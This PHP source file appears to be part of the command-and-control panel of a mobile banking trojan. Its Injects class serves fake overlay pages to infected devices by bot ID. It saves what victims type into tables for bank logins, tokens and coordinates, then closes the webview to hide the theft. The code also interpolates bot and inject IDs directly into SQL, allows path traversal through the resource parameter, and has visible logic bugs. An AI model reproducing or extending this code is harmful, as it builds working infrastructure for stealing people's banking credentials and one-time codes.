<?php
if(!defined('MODE')) hlp::show_404();

require 'pdo.php';
require_once 'hlp.php';

class Injects
{
	public $db;
	public $debug = false;
	public $injects_dir = '';
	public $client_cfg = null;
	public $language = "";
	
	public $mimeTypes = array(
'js'=>'text/javascript', 'gif'=>'image/gif', 'jpeg'=>'image/jpeg', 'jpe'=>'image/jpg', 'jpg'=>'image/jpeg', 'bmp'=>'image/x-ms-bmp', 'css'=>'text/css', 'htm'=>'text/html', 'html'=>'text/html', 'shtml'=>'text/html', 'txt'=>'text/plain', 'xml'=>'text/xml', 'xht'=>'application/xhtml+xml', 'xhtm'=>'application/xhtml+xml', 'xhtml'=>'application/xhtml+xml', 'rss'=>'application/rss+xml', 'atom'=>'application/atom+xml', 'xslt'=>'application/xslt+xml', 'rdf'=>'application/rdf+xml', 'wml'=>'application/wml+xml', 'svg'=>'image/svg+xml', 'svgz'=>'image/svg+xml', 'ico'=>'image/x-icon', 'png'=>'image/png', 'wav'=>'audio/wav', 'wav'=>'audio/x-wav', 'avi'=>'video/x-msvideo', 'mpeg'=>'video/mpeg', 'mpg'=>'video/mpeg', 'mpe'=>'video/mpeg', 'm2v'=>'video/mpeg', 'm1v'=>'video/mpeg', 'mpa'=>'video/mpeg', 'mp4'=>'video/mp4', 'mpg4'=>'video/mp4', 'ogg'=>'application/ogg', 'mp3'=>'audio/mp3', 'ttf'=>'application/x-font-ttf', 'ttc'=>'application/x-font-ttf', 'z'=>'application/x-compress', 'gz'=>'application/x-gzip', 'gzip'=>'application/x-gzip', 'tgz'=>'application/x-gzip', 'bz2'=>'application/bzip2', 'tbz'=>'application/bzip2', 'tbz2'=>'application/bzip2', 'lzma'=>'application/x-lzma', 'tlz'=>'application/x-lzma', 'tlzma'=>'application/x-lzma', 'xz'=>'application/x-xz', 'txz'=>'application/x-xz', 'tar'=>'application/x-tar', 'tgz'=>'application/x-tar', 'gz'=>'application/x-tar', 'tbz'=>'application/x-tar', 'tbz2'=>'application/x-tar', 'bz2'=>'application/x-tar', 'tlz'=>'application/x-tar', 'tlzma'=>'application/x-tar', 'lzma'=>'application/x-tar', 'txz'=>'application/x-tar', 'xz'=>'application/x-tar', 'rpm'=>'application/x-rpm', 'pdf'=>'application/pdf', 'tif'=>'image/tiff', 'tiff'=>'image/tiff', 'exe'=>'application/x-msdownload', 'dll'=>'application/x-msdownload', 'bat'=>'application/x-msdownload', 'pif'=>'application/x-msdownload', 'com'=>'application/x-msdownload', 'scr'=>'application/x-msdownload', 'msi'=>'application/x-msdownload', 'url'=>'application/internet-shortcut', 'zip'=>'application/x-zip-compressed', 'rar'=>'application/x-rar-compressed', 'doc'=>'application/msword', 'dot'=>'application/msword', 'wiz'=>'application/msword', 'wzs'=>'application/msword', 'docx'=>'application/msword', 'rtf'=>'application/rtf', 'rtx'=>'text/richtext', 'xls'=>'application/vnd.ms-excel', 'xl'=>'application/vnd.ms-excel', 'xla'=>'application/vnd.ms-excel', 'xlb'=>'application/vnd.ms-excel', 'xlc'=>'application/vnd.ms-excel', 'xld'=>'application/vnd.ms-excel', 'xlk'=>'application/vnd.ms-excel', 'xll'=>'application/vnd.ms-excel', 'xlm'=>'application/vnd.ms-excel', 'xlt'=>'application/vnd.ms-excel', 'xlv'=>'application/vnd.ms-excel', 'xlw'=>'application/vnd.ms-excel', 'csv'=>'application/vnd.ms-excel', 'xlsx'=>'application/vnd.ms-excel', 'xltx'=>'application/vnd.ms-excel', 'pot'=>'application/vnd.ms-powerpoint', 'ppa'=>'application/vnd.ms-powerpoint', 'pps'=>'application/vnd.ms-powerpoint', 'ppt'=>'application/vnd.ms-powerpoint', 'pwz'=>'application/vnd.ms-powerpoint', 'pptx'=>'application/vnd.ms-powerpoint', 'ppsx'=>'application/vnd.ms-powerpoint', 'potx'=>'application/vnd.ms-powerpoint', 'sldx'=>'application/vnd.ms-powerpoint', 'wma'=>'audio/x-ms-wma', 'wmv'=>'video/x-ms-wmv', 'wmx'=>'video/x-ms-wmv', '3gp'=>'video/3gpp', 'flac'=>'audio/flac', 'php'=>'application/x-php', 'py'=>'application/x-python', 'pyc'=>'application/x-python', 'pyw'=>'application/x-python');


	function __construct($db, $client_cfg, $language)
	{
		$this->client_cfg = $client_cfg;
		$this->db = $db;
		$this->language = $language;
		
		$this->db->exec("use {$this->client_cfg['db_main']}");
		$this->injects_dir = dirname(__FILE__) ."/injects/";
	}
	
	function show_resource($data)
	{
		// http://localhost/git/panel2/www/?m=11&res=img/arr.png&bs=c4ca4238a0b923820dcc509a6f75849b
		
		// res = file name (img/bg.jpg) 
		// g=1 - path to injects/general_resources/
		
		$folder = hlp::decrypt($data['p']);
		
		if(!empty($data['g']))
			$folder = 'general_resources';

		$res = $this->injects_dir . $folder . $data['res'];
		// user custom resource
		$res_custom = $this->injects_dir . $folder."_".$this->client_cfg['uid'] . $data['res'];
		
		if(file_exists($res_custom))
			$res = $res_custom;
		
		if(!file_exists($res) || !strstr($res, "."))
		{
			hlp::show_404();
		}
		
		$parts = explode('.', $res);
		$ext = array_pop($parts);
		
		if(!array_key_exists($ext, $this->mimeTypes))
			hlp::show_404();
		
		header("Content-type: {$this->mimeTypes[$ext]}");
		echo file_get_contents($res);
		die;
	}
	
	// see app_www/njs/index.php
	function save($bot_id, $data)
	{
		if(!isset($data['fields']) || !isset($data['page_id']))
			$this->black_screen();

		$inject_id = (int) $data['page_id'];
		$inject_id /= 1024;
		if($inject_id < 1)
			$this->black_screen();
			
		# clean input data
		$fields_clean = array();
		foreach($data['fields'] as $k=>$v)
			$fields_clean[trim($k)] = strip_tags(trim($v));
		
		$data = json_encode($fields_clean);

		$table = 'bot_banks';
		// special tokens inject
		if (!empty($data['rstp']) && in_array($data['rstp'], array('banks', 'tokens', 'coordinates')))
			$table = "bot_" . $t;
		
		$sql = "insert into {$this->client_cfg['db_name']}.{$table}(inject_id, bot_id, data) values(:inject_id, :bot_id, :data)";
		$vars = array(
			array(':inject_id', $inject_id, PDO::PARAM_INT),
			array(':bot_id', $bot_id, PDO::PARAM_STR, 32),
			array(':data', $data, PDO::PARAM_STR),
		);
		
		$this->db->exec($sql, $vars);
		
		// increment usage counter
		$this->db->exec("update injects set used = used + 1 where id={$inject_id}");
		
		if($this->debug)
		{
			echo "<pre>";
			print_r($vars);
			die($sql);
		}
		
		// redirect to hideme to close webview
		die("<html><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8' /><meta http-equiv='refresh' content='0;url=?hideme=1' /></head><body><script type='text/javascript'>window.location = '?hideme=1';</script></body></html>");
	}
	
	function black_screen()
	{
		die("<html><body style='background-color: black; color: black'>&nbsp;</body></html>");
	}
	
	function draw($bot_id, $inject_id, $data)
	{
		if($inject_id < 1)
			$this->black_screen();

		$sql = "select step from injects_queue where bot_id = '{$bot_id}' and app = (select app from injects where id = '{$inject_id}')";
		$res = $this->db->exec($sql, null, true);
		$injects_table = (sizeof($res))? $res[0][0] : 'injects';
		
		// For debug: no user perm check
		$user_perms_check = ($this->debug)? '' : 
			"and {$injects_table}.id = (select inject_id from {$this->client_cfg['db_name']}.injects where inject_id={$inject_id})";
			
		$sql = "select app, folder 
		from {$injects_table}, groups 
		where 
			{$injects_table}.id={$inject_id}
			{$user_perms_check}";
//~ echo $sql;
		$res = $this->db->exec($sql, null, true);
		if(!sizeof($res))
			$this->black_screen(); // this user has no this inject
		
		$row = $res[0];
		
		$inj_path = $this->injects_dir . $row['folder'];
		
		// if specific customer version exists
		if(file_exists($inj_path."_".$this->client_cfg['uid']))
			$inj_path = $inj_path."_".$this->client_cfg['uid'];
		
		if(file_exists($inj_path . "/index.php")) // php inject
		{
			$GLOBALS['language'] = $this->language;
			include($inj_path . "/index.php");
			$data = $GLOBALS['html'];
			
		}else{ // html inject
			$data = file_get_contents($inj_path . "/index.html");
		}

		if($this->debug)
			$bs = "?bs={$bot_id}:{$inject_id}";
		else
			$bs = '';
			
		$inj_id_hidden = $inject_id * 1024;
		$pkg_hidden = urlencode(hlp::encrypt($row['folder']));

		// could be converted to inline images (gif, jpeg, jpg, png) with preg_match
		$data = str_replace('%DYN_PATH%', "?m={$inj_id_hidden}&p={$pkg_hidden}&res=", $data);
		
		$data = str_replace('%DYN_PATH_GENERAL%', "?m={$inj_id_hidden}&p={$pkg_hidden}&g=1&res=", $data);
		$data = str_replace('%ACTION%', $bs, $data);
		//~ $data = str_replace('%PKG%', hlp::encrypt($row['app']), $data);
		$data = str_replace('%PKG%', $inj_id_hidden, $data);
		
		$data = str_replace('%BOTID%', $bot_id, $data);
		
		return $data;
	}
	
}

